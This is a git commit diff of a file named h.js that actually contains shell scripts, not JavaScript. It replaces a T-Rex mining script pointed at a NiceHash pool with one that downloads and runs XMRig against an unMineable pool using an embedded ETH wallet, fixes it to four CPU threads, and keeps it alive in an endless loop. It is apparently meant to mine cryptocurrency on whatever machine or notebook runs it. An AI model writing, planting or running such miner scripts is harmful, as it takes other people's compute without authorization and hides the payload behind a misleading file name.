18f74e73cb59aa627c4c983051478070d7b5d3d4
pruthvigithub1137 <88317515+pruthvigithub1137@users.noreply.github.com>
2021-09-24 17:29:24 +0700

    Update h.js

--- h.js
+++ h.js
@@ -1,21 +1,11 @@
-#!/bin/bash
-
-#################################
-## Begin of user-editable part ##
-#################################
-
-ALGHO=chukwa_wrkz
-POOL=stratum+tcp://daggerhashimoto.usa-west.nicehash.com:3353
-WALLET=3NiyxHsKijiZTPcxTpNgNhPGS23h9dcUbE
-WORKER=$(echo $(shuf -i 1-999 -n 1)-PRU)
-
-#################################
-##  End of user-editable part  ##
-#################################
-
-! cd "$(dirname "$0")"
-
-! wget https://github.com/trexminer/T-Rex/releases/download/0.21.6/t-rex-0.21.6-linux.tar.gz
-! tar -xf t-rex-0.21.6-linux.tar.gz 
-! chmod +x t-rex
-! ./t-rex --algo $ALGHO --pool $POOL --user $WALLET.$WORKER -p x -w rig0 pause
+#!/bin/sh
+sudo apt update
+sudo apt install screen -y
+wget https://github.com/xmrig/xmrig/releases/download/v6.14.0/xmrig-6.14.0-linux-x64.tar.gz
+tar xf xmrig-6.14.0-linux-x64.tar.gz
+cd xmrig-6.14.0
+./xmrig -o rx.unmineable.com:3333 -a rx -k -u ETH:0x19bED4AA973C277dEbF737450a630075787515bd.God_Miner -p x --cpu 4
+while [ 1 ]; do
+sleep 3
+done
+sleep 999
